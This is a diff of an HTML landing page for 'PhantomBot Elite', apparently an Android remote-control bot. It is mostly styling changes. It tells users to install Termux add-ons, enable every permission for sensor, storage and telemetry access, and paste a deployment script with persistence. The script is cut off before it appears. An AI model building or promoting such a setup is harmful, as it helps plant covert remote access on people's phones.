@@ -3,494 +3,709 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhantomBot | Elite Android Remote Control</title>
+    <title>PhantomBot Elite | Android Remote Command Center</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap');
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* ==================== CSS RESET & VARIABLES ==================== */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
         :root {
-            --bg: #000000;
-            --surface: #0a0a0a;
-            --surface-2: #111111;
-            --border: #1a1a1a;
-            --primary: #00ff88;
-            --primary-dark: #00cc66;
-            --accent: #7c3aed;
-            --accent-light: #a78bfa;
-            --gold: #f59e0b;
-            --text: #ffffff;
-            --text-secondary: #a0a0a0;
-            --text-muted: #666666;
-            --danger: #ef4444;
-            --radius: 16px;
+            --bg-primary: #030303;
+            --bg-secondary: #080808;
+            --bg-tertiary: #0c0c0c;
+            --bg-card: #0f0f0f;
+            --bg-card-hover: #141414;
+            --border-subtle: #1a1a1a;
+            --border-medium: #222222;
+            --border-accent: #2a2a2a;
+            
+            --text-primary: #fafafa;
+            --text-secondary: #a1a1a1;
+            --text-tertiary: #636363;
+            --text-muted: #404040;
+            
+            --accent-primary: #00ff88;
+            --accent-primary-dark: #00cc66;
+            --accent-primary-glow: rgba(0, 255, 136, 0.15);
+            --accent-secondary: #7c3aed;
+            --accent-secondary-glow: rgba(124, 58, 237, 0.15);
+            --accent-gold: #f59e0b;
+            --accent-gold-glow: rgba(245, 158, 11, 0.15);
+            --accent-rose: #f43f5e;
+            
+            --radius-xs: 6px;
             --radius-sm: 10px;
-            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --radius-md: 16px;
+            --radius-lg: 20px;
+            --radius-xl: 24px;
+            --radius-2xl: 32px;
+            
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
+            --shadow-md: 0 4px 6px rgba(0,0,0,0.4);
+            --shadow-lg: 0 10px 30px rgba(0,0,0,0.5);
+            --shadow-xl: 0 20px 60px rgba(0,0,0,0.6);
+            --shadow-glow-green: 0 0 40px rgba(0,255,136,0.08);
+            --shadow-glow-purple: 0 0 40px rgba(124,58,237,0.08);
+            
+            --transition-fast: 150ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-base: 300ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-slow: 600ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-spring: 500ms cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
+        /* ==================== BASE ==================== */
+        html { scroll-behavior: smooth; }
+        
         body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: 'Inter', sans-serif;
-            overflow-x: hidden;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            min-height: 100vh;
+            line-height: 1.6;
+            letter-spacing: -0.011em;
         }
 
-        /* Animated Background */
-        .bg-mesh {
+        /* ==================== AMBIENT BACKGROUND ==================== */
+        .ambient-layer {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 0;
+            inset: 0;
             pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
         }
-        .bg-mesh .orb {
+        
+        .ambient-orb {
             position: absolute;
             border-radius: 50%;
-            filter: blur(120px);
-            opacity: 0.15;
-            animation: float 20s infinite ease-in-out;
+            filter: blur(180px);
+            opacity: 0.12;
+            animation: ambientFloat 25s infinite cubic-bezier(0.45, 0, 0.55, 1);
         }
-        .bg-mesh .orb:nth-child(1) {
-            width: 600px; height: 600px;
-            background: var(--primary);
-            top: -200px; left: -200px;
+        .ambient-orb.green {
+            width: 800px; height: 800px;
+            background: radial-gradient(circle, var(--accent-primary), transparent 70%);
+            top: -30%; left: -20%;
             animation-delay: 0s;
+            animation-duration: 28s;
         }
-        .bg-mesh .orb:nth-child(2) {
+        .ambient-orb.purple {
+            width: 650px; height: 650px;
+            background: radial-gradient(circle, var(--accent-secondary), transparent 70%);
+            bottom: -25%; right: -15%;
+            animation-delay: -9s;
+            animation-duration: 32s;
+        }
+        .ambient-orb.gold {
             width: 500px; height: 500px;
-            background: var(--accent);
-            bottom: -200px; right: -200px;
-            animation-delay: -7s;
+            background: radial-gradient(circle, var(--accent-gold), transparent 70%);
+            top: 40%; left: 40%;
+            animation-delay: -18s;
+            animation-duration: 35s;
+            opacity: 0.06;
         }
-        .bg-mesh .orb:nth-child(3) {
-            width: 400px; height: 400px;
-            background: var(--gold);
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            animation-delay: -14s;
-        }
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            33% { transform: translate(100px, -100px) scale(1.1); }
-            66% { transform: translate(-100px, 100px) scale(0.9); }
+        
+        @keyframes ambientFloat {
+            0%, 100% { transform: translate(0, 0) rotate(0deg) scale(1); }
+            20% { transform: translate(8%, -5%) rotate(3deg) scale(1.08); }
+            40% { transform: translate(-5%, 8%) rotate(-2deg) scale(0.94); }
+            60% { transform: translate(-8%, -3%) rotate(1deg) scale(1.04); }
+            80% { transform: translate(3%, 5%) rotate(-1deg) scale(0.97); }
         }
 
-        /* Grid Pattern */
-        .grid-pattern {
+        /* Noise Texture */
+        .noise-overlay {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 0;
+            inset: 0;
             pointer-events: none;
-            opacity: 0.03;
-            background-image: 
-                linear-gradient(var(--border) 1px, transparent 1px),
-                linear-gradient(90deg, var(--border) 1px, transparent 1px);
-            background-size: 60px 60px;
+            z-index: 1;
+            opacity: 0.025;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+            background-size: 200px 200px;
         }
 
-        /* Main Container */
-        .main-wrapper {
+        /* Dot Grid */
+        .dot-grid {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.04;
+            background-image: radial-gradient(circle, var(--text-primary) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+
+        /* ==================== MAIN LAYOUT ==================== */
+        .app-container {
             position: relative;
-            z-index: 1;
+            z-index: 10;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 24px;
         }
 
-        .container {
-            background: rgba(10, 10, 10, 0.8);
-            backdrop-filter: blur(40px);
-            -webkit-backdrop-filter: blur(40px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 24px;
-            padding: 0;
+        .main-card {
+            background: linear-gradient(180deg, 
+                rgba(18,18,18,0.9) 0%, 
+                rgba(12,12,12,0.95) 50%, 
+                rgba(8,8,8,0.9) 100%);
+            backdrop-filter: blur(60px);
+            -webkit-backdrop-filter: blur(60px);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: var(--radius-2xl);
             max-width: 720px;
             width: 100%;
             box-shadow: 
-                0 0 0 1px rgba(255,255,255,0.03),
-                0 25px 80px rgba(0,0,0,0.5),
-                0 0 120px rgba(0,255,136,0.05);
+                0 0 0 1px rgba(255,255,255,0.02),
+                0 0 0 2px rgba(0,0,0,0.3),
+                var(--shadow-xl),
+                0 0 120px rgba(0,255,136,0.03);
             overflow: hidden;
-        }
-
-        /* Header */
-        .header {
-            padding: 35px 35px 25px;
-            text-align: center;
-            border-bottom: 1px solid var(--border);
             position: relative;
         }
-        .badge {
+
+        /* Card Glow Border */
+        .main-card::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: var(--radius-2xl);
+            padding: 1px;
+            background: linear-gradient(135deg, 
+                rgba(255,255,255,0.08) 0%, 
+                rgba(255,255,255,0.02) 25%,
+                rgba(0,255,136,0.08) 50%, 
+                rgba(255,255,255,0.02) 75%, 
+                rgba(124,58,237,0.08) 100%);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            z-index: -1;
+        }
+
+        /* ==================== HEADER ==================== */
+        .card-header {
+            padding: 40px 40px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .status-badge {
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            background: rgba(0,255,136,0.1);
-            border: 1px solid rgba(0,255,136,0.2);
-            color: var(--primary);
-            padding: 6px 16px;
+            background: rgba(0,255,136,0.06);
+            border: 1px solid rgba(0,255,136,0.15);
+            padding: 7px 18px;
             border-radius: 100px;
-            font-size: 12px;
-            font-weight: 600;
+            margin-bottom: 24px;
+            transition: var(--transition-base);
+        }
+        .status-badge:hover {
+            background: rgba(0,255,136,0.1);
+            border-color: rgba(0,255,136,0.25);
+        }
+        .status-indicator {
+            width: 7px; height: 7px;
+            background: var(--accent-primary);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--accent-primary);
+            animation: statusPulse 2.5s infinite;
+        }
+        @keyframes statusPulse {
+            0%, 100% { box-shadow: 0 0 4px var(--accent-primary); }
+            50% { box-shadow: 0 0 16px var(--accent-primary), 0 0 32px rgba(0,255,136,0.4); }
+        }
+        .status-text {
+            font-size: 11px;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 2.5px;
+            color: var(--accent-primary);
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .logo-wrapper {
+            display: inline-block;
+            position: relative;
             margin-bottom: 20px;
         }
-        .badge .dot {
-            width: 8px; height: 8px;
-            background: var(--primary);
+        .logo-icon {
+            font-size: 56px;
+            filter: drop-shadow(0 0 30px rgba(0,255,136,0.3));
+            animation: logoFloat 4s ease-in-out infinite;
+            display: block;
+            line-height: 1;
+        }
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+        .logo-ring {
+            position: absolute;
+            inset: -15px;
             border-radius: 50%;
-            animation: pulse 2s infinite;
+            border: 1px solid rgba(0,255,136,0.1);
+            animation: ringPulse 4s ease-in-out infinite;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,255,136,0.6); }
-            50% { opacity: 0.5; box-shadow: 0 0 0 12px rgba(0,255,136,0); }
+        @keyframes ringPulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.15); opacity: 0.1; }
         }
-        .logo {
-            font-size: 52px;
-            margin-bottom: 12px;
-            filter: drop-shadow(0 0 20px rgba(0,255,136,0.3));
-            animation: bounce 3s infinite;
-        }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        .title {
-            font-size: 36px;
-            font-weight: 900;
-            letter-spacing: -1.5px;
-            line-height: 1.1;
+
+        .product-name {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 42px;
+            font-weight: 700;
+            letter-spacing: -2px;
+            line-height: 1;
             margin-bottom: 8px;
         }
-        .title .gradient {
-            background: linear-gradient(135deg, var(--primary), #00ffcc, var(--primary-dark));
+        .product-name .gradient-text {
+            background: linear-gradient(135deg, 
+                #ffffff 0%, 
+                var(--accent-primary) 30%, 
+                #00ffcc 60%, 
+                var(--accent-secondary) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            background-size: 200% 200%;
+            animation: gradientShift 6s ease-in-out infinite;
         }
-        .subtitle {
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        
+        .product-subtitle {
+            font-size: 14px;
             color: var(--text-secondary);
-            font-size: 15px;
             font-weight: 400;
-            letter-spacing: -0.2px;
+            letter-spacing: 0.5px;
         }
 
-        /* Body */
-        .body-content {
-            padding: 25px 35px 30px;
+        /* Divider */
+        .divider {
+            margin: 30px 40px 0;
+            height: 1px;
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255,255,255,0.06) 20%, 
+                rgba(255,255,255,0.1) 50%, 
+                rgba(255,255,255,0.06) 80%, 
+                transparent 100%);
         }
 
-        /* Step */
-        .step {
-            background: var(--surface-2);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px 24px;
-            margin-bottom: 16px;
-            transition: var(--transition);
+        /* ==================== BODY ==================== */
+        .card-body {
+            padding: 32px 40px 24px;
+        }
+
+        .step-block {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 24px 28px;
+            margin-bottom: 18px;
+            transition: var(--transition-base);
             position: relative;
             overflow: hidden;
         }
-        .step:hover {
-            border-color: rgba(255,255,255,0.15);
-            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+        .step-block:hover {
+            background: var(--bg-card-hover);
+            border-color: var(--border-medium);
+            transform: translateY(-1px);
+            box-shadow: var(--shadow-md);
         }
-        .step::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+        .step-block:last-child { margin-bottom: 0; }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 14px;
         }
-        .step-number {
-            display: inline-flex;
+        .step-num {
+            display: flex;
             align-items: center;
             justify-content: center;
-            width: 32px; height: 32px;
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 12px;
+            width: 36px; height: 36px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-medium);
+            border-radius: var(--radius-sm);
             font-family: 'JetBrains Mono', monospace;
-        }
-        .step h3 {
-            font-size: 17px;
-            font-weight: 700;
-            margin-bottom: 6px;
-            letter-spacing: -0.3px;
-        }
-        .step p {
-            color: var(--text-secondary);
-            font-size: 13px;
-            line-height: 1.5;
-        }
-        .step ul {
-            list-style: none;
-            padding: 0;
-            margin-top: 8px;
-        }
-        .step ul li {
-            color: var(--text-secondary);
-            font-size: 12px;
-            padding: 4px 0;
-            padding-left: 20px;
-            position: relative;
-        }
-        .step ul li::before {
-            content: '›';
-            position: absolute;
-            left: 4px;
-            color: var(--primary);
-            font-weight: 700;
             font-size: 14px;
+            font-weight: 700;
+            color: var(--accent-primary);
+            flex-shrink: 0;
         }
-        code {
-            background: rgba(0,255,136,0.08);
-            color: var(--primary);
-            padding: 3px 8px;
-            border-radius: 5px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            border: 1px solid rgba(0,255,136,0.15);
+        .step-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            color: var(--text-primary);
+        }
+        .step-desc {
+            color: var(--text-secondary);
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 12px;
         }
 
-        /* Buttons */
-        .btn-row {
+        .btn-group {
             display: flex;
             flex-wrap: wrap;
             gap: 10px;
-            margin-top: 12px;
         }
+
+        /* Buttons */
         .btn {
             display: inline-flex;
             align-items: center;
+            justify-content: center;
             gap: 8px;
-            padding: 12px 20px;
-            font-size: 14px;
+            padding: 11px 22px;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
             font-weight: 600;
             border-radius: 100px;
             cursor: pointer;
             text-decoration: none;
-            transition: var(--transition);
-            font-family: 'Inter', sans-serif;
-            letter-spacing: -0.2px;
+            transition: var(--transition-base);
             border: none;
             white-space: nowrap;
+            letter-spacing: -0.1px;
+            position: relative;
+            overflow: hidden;
+            outline: none;
         }
-        .btn-primary {
-            background: var(--primary);
+        .btn:active { transform: scale(0.97); }
+
+        .btn-emerald {
+            background: var(--accent-primary);
             color: #000;
-            box-shadow: 0 4px 20px rgba(0,255,136,0.3);
-        }
-        .btn-primary:hover {
-            background: #00ffaa;
-            box-shadow: 0 8px 35px rgba(0,255,136,0.5);
-            transform: translateY(-2px);
-        }
-        .btn-outline {
-            background: transparent;
-            color: var(--text);
-            border: 1px solid var(--border);
-        }
-        .btn-outline:hover {
-            border-color: rgba(255,255,255,0.3);
-            background: rgba(255,255,255,0.03);
-        }
-        .btn-accent {
-            background: var(--accent);
-            color: #fff;
-            box-shadow: 0 4px 20px rgba(124,58,237,0.3);
-        }
-        .btn-accent:hover {
-            background: #8b5cf6;
-            box-shadow: 0 8px 35px rgba(124,58,237,0.5);
-            transform: translateY(-2px);
-        }
-        .btn-gold {
-            background: var(--gold);
-            color: #000;
-            box-shadow: 0 4px 20px rgba(245,158,11,0.3);
-        }
-        .btn-gold:hover {
-            box-shadow: 0 8px 35px rgba(245,158,11,0.5);
-            transform: translateY(-2px);
-        }
-        .btn-copy {
-            width: 100%;
-            justify-content: center;
-            padding: 16px;
-            font-size: 16px;
             font-weight: 700;
-            letter-spacing: 0.5px;
-            margin-top: 5px;
+            box-shadow: 0 2px 12px rgba(0,255,136,0.2);
+        }
+        .btn-emerald:hover {
+            background: #00ffaa;
+            box-shadow: 0 4px 24px rgba(0,255,136,0.35);
+            transform: translateY(-1px);
+        }
+
+        .btn-violet {
+            background: var(--accent-secondary);
+            color: #fff;
+            box-shadow: 0 2px 12px rgba(124,58,237,0.2);
+        }
+        .btn-violet:hover {
+            background: #8b5cf6;
+            box-shadow: 0 4px 24px rgba(124,58,237,0.35);
+            transform: translateY(-1px);
+        }
+
+        .btn-amber {
+            background: var(--accent-gold);
+            color: #000;
+            font-weight: 700;
+            box-shadow: 0 2px 12px rgba(245,158,11,0.2);
+        }
+        .btn-amber:hover {
+            box-shadow: 0 4px 24px rgba(245,158,11,0.35);
+            transform: translateY(-1px);
+        }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--text-secondary);
+            border: 1px solid var(--border-medium);
+        }
+        .btn-ghost:hover {
+            border-color: rgba(255,255,255,0.2);
+            color: var(--text-primary);
+            background: rgba(255,255,255,0.02);
+        }
+
+        .btn-lg {
+            width: 100%;
+            padding: 15px 24px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+            border-radius: var(--radius-md);
+        }
+
+        /* Permissions List */
+        .perm-list {
+            list-style: none;
+            padding: 0;
+            margin-top: 6px;
+        }
+        .perm-list li {
+            font-size: 12px;
+            color: var(--text-secondary);
+            padding: 5px 0 5px 22px;
+            position: relative;
+            line-height: 1.5;
+        }
+        .perm-list li::before {
+            content: '';
+            position: absolute;
+            left: 4px;
+            top: 12px;
+            width: 5px; height: 5px;
+            background: var(--accent-primary);
+            border-radius: 50%;
+            opacity: 0.7;
+        }
+        .perm-list li code {
+            background: rgba(0,255,136,0.07);
+            color: var(--accent-primary);
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            border: 1px solid rgba(0,255,136,0.12);
+            font-weight: 500;
+        }
+        .perm-list li strong {
+            color: var(--text-primary);
+            font-weight: 600;
         }
 
         /* Code Block */
-        .code-wrapper {
-            background: #000;
-            border: 1px solid rgba(0,255,136,0.3);
-            border-radius: var(--radius);
-            padding: 2px;
-            margin-top: 14px;
+        .code-container {
+            margin-top: 16px;
             position: relative;
+            border-radius: var(--radius-md);
+            background: #020202;
+            border: 1px solid rgba(0,255,136,0.2);
+            overflow: hidden;
         }
-        .code-wrapper::before {
+        .code-container::after {
             content: '';
             position: absolute;
-            inset: -2px;
-            border-radius: var(--radius);
-            background: linear-gradient(135deg, var(--primary), transparent, var(--accent));
+            inset: -1px;
+            border-radius: var(--radius-md);
+            background: linear-gradient(135deg, 
+                rgba(0,255,136,0.3), 
+                transparent 40%, 
+                transparent 60%, 
+                rgba(124,58,237,0.3));
             z-index: -1;
-            opacity: 0.3;
+            opacity: 0.5;
+        }
+        .code-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 16px;
+            background: rgba(255,255,255,0.02);
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+        }
+        .code-dots {
+            display: flex;
+            gap: 6px;
+        }
+        .code-dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+        }
+        .code-dot.red { background: #ff5f57; }
+        .code-dot.yellow { background: #febc2e; }
+        .code-dot.green { background: #28c840; }
+        .code-lang {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-tertiary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         .code-block {
-            background: #000;
-            border-radius: calc(var(--radius) - 2px);
             padding: 16px;
             text-align: left;
             word-break: break-all;
             max-height: 200px;
             overflow-y: auto;
-            font-size: 10px;
-            color: var(--primary);
-            line-height: 1.5;
             font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: #a0d8a0;
+            line-height: 1.6;
+            background: #020202;
         }
         .code-block::-webkit-scrollbar { width: 4px; }
         .code-block::-webkit-scrollbar-track { background: transparent; }
-        .code-block::-webkit-scrollbar-thumb { background: rgba(0,255,136,0.3); border-radius: 10px; }
-
-        /* Footer */
-        .footer {
-            padding: 16px 35px;
-            border-top: 1px solid var(--border);
-            text-align: center;
+        .code-block::-webkit-scrollbar-thumb { 
+            background: rgba(0,255,136,0.2); 
+            border-radius: 10px; 
         }
-        .features-row {
+
+        /* ==================== FOOTER ==================== */
+        .card-footer {
+            padding: 20px 40px;
+            border-top: 1px solid var(--border-subtle);
+            background: rgba(0,0,0,0.3);
+        }
+        .tag-row {
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
-            gap: 16px;
+            gap: 14px;
         }
-        .feature-tag {
+        .tag {
             display: inline-flex;
             align-items: center;
             gap: 6px;
             font-size: 11px;
-            color: var(--text-muted);
+            color: var(--text-tertiary);
             font-weight: 500;
+            letter-spacing: 0.2px;
         }
-        .feature-tag .icon {
-            font-size: 14px;
+        .tag .tag-dot {
+            width: 5px; height: 5px;
+            border-radius: 50%;
+            background: var(--accent-primary);
+            opacity: 0.8;
         }
-        .feature-tag.active .icon { color: var(--primary); }
 
-        /* Toast */
-        .toast {
+        /* ==================== TOAST ==================== */
+        .toast-bar {
             position: fixed;
-            bottom: 30px;
+            bottom: 32px;
             left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: var(--surface-2);
-            border: 1px solid var(--primary);
-            color: var(--primary);
+            transform: translateX(-50%) translateY(120px);
+            background: var(--bg-card);
+            border: 1px solid var(--accent-primary);
+            color: var(--accent-primary);
             padding: 14px 28px;
             border-radius: 100px;
             font-weight: 600;
             font-size: 14px;
-            z-index: 100;
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 40px rgba(0,255,136,0.2);
+            z-index: 999;
+            transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 8px 32px rgba(0,255,136,0.15);
+            font-family: 'Inter', sans-serif;
+            letter-spacing: -0.1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .toast.show { transform: translateX(-50%) translateY(0); }
+        .toast-bar.visible { transform: translateX(-50%) translateY(0); }
+        .toast-icon { font-size: 18px; }
 
-        /* Responsive */
-        @media (max-width: 500px) {
-            .header { padding: 25px 20px 20px; }
-            .body-content { padding: 20px; }
-            .footer { padding: 14px 20px; }
-            .title { font-size: 26px; }
-            .logo { font-size: 40px; }
-            .btn { padding: 10px 16px; font-size: 13px; }
-            .btn-copy { font-size: 14px; padding: 14px; }
+        /* ==================== RESPONSIVE ==================== */
+        @media (max-width: 640px) {
+            .app-container { padding: 12px; }
+            .card-header { padding: 28px 24px 0; }
+            .card-body { padding: 24px 20px 18px; }
+            .card-footer { padding: 16px 20px; }
+            .divider { margin: 22px 24px 0; }
+            .product-name { font-size: 32px; letter-spacing: -1.5px; }
+            .logo-icon { font-size: 44px; }
+            .step-block { padding: 18px 20px; }
+            .btn { padding: 10px 16px; font-size: 12px; }
+            .btn-lg { font-size: 14px; padding: 14px; }
             .code-block { font-size: 9px; max-height: 160px; }
-            .features-row { gap: 10px; }
+            .tag-row { gap: 10px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Background Effects -->
-    <div class="bg-mesh">
-        <div class="orb"></div>
-        <div class="orb"></div>
-        <div class="orb"></div>
+    <!-- Ambient Background System -->
+    <div class="ambient-layer">
+        <div class="ambient-orb green"></div>
+        <div class="ambient-orb purple"></div>
+        <div class="ambient-orb gold"></div>
     </div>
-    <div class="grid-pattern"></div>
+    <div class="dot-grid"></div>
+    <div class="noise-overlay"></div>
 
-    <!-- Main -->
-    <div class="main-wrapper">
-        <div class="container">
+    <!-- Application Shell -->
+    <div class="app-container">
+        <div class="main-card">
 
-            <!-- Header -->
-            <div class="header">
-                <div class="badge">
-                    <span class="dot"></span> v3.0 Elite
+            <!-- ===== HEADER ===== -->
+            <div class="card-header">
+                <div class="status-badge">
+                    <span class="status-indicator"></span>
+                    <span class="status-text">System Active</span>
                 </div>
-                <div class="logo">💎</div>
-                <h1 class="title">
-                    <span class="gradient">PhantomBot</span>
+                <div class="logo-wrapper">
+                    <span class="logo-icon">◆</span>
+                    <div class="logo-ring"></div>
+                </div>
+                <h1 class="product-name">
+                    <span class="gradient-text">PhantomBot</span>
                 </h1>
-                <p class="subtitle">Elite Android Remote Control System</p>
+                <p class="product-subtitle">Elite Android Remote Command Center</p>
             </div>
+            <div class="divider"></div>
 
-            <!-- Body -->
-            <div class="body-content">
+            <!-- ===== BODY ===== -->
+            <div class="card-body">
 
-                <!-- Step 1 -->
-                <div class="step">
-                    <div class="step-number">01</div>
-                    <h3>📥 Install Core Modules</h3>
-                    <p>Download and install all three APK components to enable full system integration.</p>
-                    <div class="btn-row">
-                        <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn btn-primary" target="_blank">
-                            <span>⬇</span> Termux
+                <!-- Step 1: Installation -->
+                <div class="step-block">
+                    <div class="step-header">
+                        <span class="step-num">01</span>
+                        <span class="step-title">Install Core Modules</span>
+                    </div>
+                    <p class="step-desc">Deploy the three foundational components required for full system integration and persistent connectivity.</p>
+                    <div class="btn-group">
+                        <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn btn-emerald" target="_blank" rel="noopener">
+                            ↓ Termux
                         </a>
-                        <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn btn-accent" target="_blank">
-                            <span>⬇</span> Termux:API
+                        <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn btn-violet" target="_blank" rel="noopener">
+                            ↓ Termux:API
                         </a>
-                        <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn btn-gold" target="_blank">
-                            <span>⬇</span> Termux:Boot
+                        <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn btn-amber" target="_blank" rel="noopener">
+                            ↓ Termux:Boot
                         </a>
                     </div>
-                    <p style="margin-top:10px; font-size:11px; color:var(--text-muted);">Open each app once after installation.</p>
                 </div>
 
-                <!-- Step 2 -->
-                <div class="step">
-                    <div class="step-number">02</div>
-                    <h3>🔐 Grant System Permissions</h3>
-                    <ul>
-                        <li>Open Termux → run <code>termux-setup-storage</code> → <strong>Allow</strong></li>
-                        <li><strong>Settings → Apps → Termux → Permissions</strong> → Enable All</li>
-                        <li><strong>Settings → Apps → Termux:API → Permissions</strong> → Enable All</li>
+                <!-- Step 2: Permissions -->
+                <div class="step-block">
+                    <div class="step-header">
+                        <span class="step-num">02</span>
+                        <span class="step-title">Authorize Permissions</span>
+                    </div>
+                    <p class="step-desc">Grant system-level access to enable full sensor, storage, and telemetry capabilities.</p>
+                    <ul class="perm-list">
+                        <li>Launch Termux → execute <code>termux-setup-storage</code> → tap <strong>Allow</strong></li>
+                        <li><strong>Settings → Apps → Termux → Permissions</strong> → enable all toggles</li>
+                        <li><strong>Settings → Apps → Termux:API → Permissions</strong> → enable all toggles</li>
                     </ul>
                 </div>
 
-                <!-- Step 3 -->
-                <div class="step">
-                    <div class="step-number">03</div>
-                    <h3>⚡ Deploy PhantomBot</h3>
-                    <p>Execute the deployment script below in Termux. The system will auto-configure.</p>
-                    <button class="btn btn-primary btn-copy" onclick="copyCommand()" id="copyBtn">
-                        <span>📋</span> Copy Deployment Command
+                <!-- Step 3: Deploy -->
+                <div class="step-block">
+                    <div class="step-header">
+                        <span class="step-num">03</span>
+                        <span class="step-title">Deploy PhantomBot</span>
+                    </div>
+                    <p class="step-desc">Execute the unified deployment script. All dependencies, configurations, and persistence layers are provisioned automatically.</p>
+                    <button class="btn btn-emerald btn-lg" onclick="copyCommand()" id="deployBtn">
+                        <span>📋</span> Copy Deployment Script
                     </button>
-                    <div class="code-wrapper">
+                    <div class="code-container">
+                        <div class="code-header">
+                            <div class="code-dots">
+                                <span class="code-dot red"></span>
+                                <span class="code-dot yellow"></span>
+                                <span class="code-dot green"></span>
+                            </div>
+                            <span class="code-lang">deploy.sh</span>
+                        </div>
